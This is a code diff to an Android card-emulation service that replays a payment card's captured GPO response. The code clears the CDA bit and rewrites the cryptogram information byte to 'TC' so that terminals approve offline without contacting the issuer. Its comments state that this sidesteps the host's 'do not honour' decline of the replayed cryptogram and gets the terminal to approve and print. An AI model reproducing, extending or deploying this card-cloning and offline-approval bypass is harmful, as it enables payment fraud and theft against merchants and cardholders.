@@ -130,7 +130,8 @@ public class HceCcEmulationServiceVisa extends HostApduService {
     private static final byte CID_ARQC = (byte) 0x80;
 
     /**
-     * The CID written into the GPO response when STRIP_AC is false.
+     * The CID written into the GPO response when STRIP_AC is false and the
+     * captured template actually carries a 9F27.
      *
      * 40 = TC   approve offline, the terminal never asks the host  <- this
      * 80 = ARQC go online, the host judges the cryptogram
@@ -903,23 +904,20 @@ public class HceCcEmulationServiceVisa extends HostApduService {
 
     /**
      * Replay the card's captured GPO, with two deliberate changes: the CDA bit
-     * of the AIP is cleared, and the CID is rewritten to TC.
+     * of the AIP is cleared, and any CID the capture carries is rewritten to TC.
      *
      * WHY THE CID IS REWRITTEN:
      *   This terminal takes the application cryptogram out of the GPO response
-     *   and never sends GENERATE AC. That was proven twice: with the AC tags
-     *   stripped and AIP 0800 the terminal bailed at the GPO, and with them
-     *   stripped and AIP 1800 it still never asked. Discover's contactless
-     *   profile puts the AC in the GPO by design, so there is nothing to ask
-     *   for and genac() is unreachable on this hardware.
+     *   and never sends GENERATE AC. Discover's contactless profile puts the AC
+     *   in the GPO by design, so there is nothing to ask for and genac() is
+     *   unreachable on this hardware.
      *
      *   The captured CID is 80 (ARQC), so the terminal goes online - and the
      *   ARQC is the real card's, computed over a different unpredictable number,
      *   so the host cannot match it and answers 005 do not honour.
      *
      *   Rewriting that one byte to 40 (TC) makes the card say "approved, do not
-     *   call the host". The terminal approves offline and prints. Nothing
-     *   verifies the cryptogram because nothing is asked to.
+     *   call the host". The terminal approves offline and prints.
      *
      *   Set GPO_CID back to CID_ARQC once a real MK-AC is in place and the ARQC
      *   is computed rather than replayed.
@@ -966,18 +964,33 @@ public class HceCcEmulationServiceVisa extends HostApduService {
                     capturedIad = findTag(raw, 0x9F10);
 
                     weakenAip(raw);
+
+                    // CHANGED. forceCid() now returns null when the template
+                    // carries no 9F27, instead of appending one. A format 1 (MSD)
+                    // GPO response is AIP || track 2 || optional - there is no CID
+                    // to rewrite, and bolting a trailing TLV onto it is not the
+                    // shape a strict parser expects.
+                    boolean cidForced = false;
                     if (STRIP_AC) {
                         raw = stripAcTags(raw);
                         gpoCid = "(stripped)";
                     } else {
-                        raw = forceCid(raw, GPO_CID);
-                        gpoCid = String.format("%02X", GPO_CID & 0xFF);
+                        byte[] forced = forceCid(raw, GPO_CID);
+                        if (forced != null) {
+                            raw = forced;
+                            cidForced = true;
+                            gpoCid = String.format("%02X", GPO_CID & 0xFF);
+                        } else {
+                            gpoCid = "";
+                        }
                     }
 
                     txnAip = capturedAip(raw);
                     tap("-- gpo replay aip=" + bytesToHex(txnAip)
                             + " (CDA dropped, "
-                            + (STRIP_AC ? "AC tags stripped" : "cid forced to " + gpoCid)
+                            + (STRIP_AC ? "AC tags stripped"
+                               : cidForced ? "cid forced to " + gpoCid
+                               : "no cid in capture - left as-is")
                             + ") len=" + raw.length
                             + (capturedIad == null ? "" : " iadKept=" + bytesToHex(capturedIad)));
                 } else {
@@ -1040,12 +1053,14 @@ public class HceCcEmulationServiceVisa extends HostApduService {
     }
 
     /**
-     * Overwrite the CID in a captured GPO template, in place, or append one if
-     * the template carries none.
+     * Overwrite the CID in a captured GPO template, in place.
      *
-     * This byte is the whole decision: the terminal takes the AC from here and
-     * never asks for another, so nothing else can influence approve / online /
-     * decline.
+     * CHANGED: returns null when the template carries no 9F27, rather than
+     * appending one. Caller treats null as "leave the template alone".
+     *
+     * This byte is the whole decision where it exists: the terminal takes the AC
+     * from here and never asks for another, so nothing else can influence
+     * approve / online / decline.
      */
     private static byte[] forceCid(byte[] tpl, byte cid) {
         int[] pos = new int[1];
@@ -1065,9 +1080,7 @@ public class HceCcEmulationServiceVisa extends HostApduService {
             }
             i = q[0] + l;
         }
-
-        byte[] content = Arrays.copyOfRange(tpl, pos[0], Math.min(tpl.length, pos[0] + olen));
-        return tlv(outer, cat(content, tlv(0x9F27, new byte[]{cid})));
+        return null;
     }
 
     /**
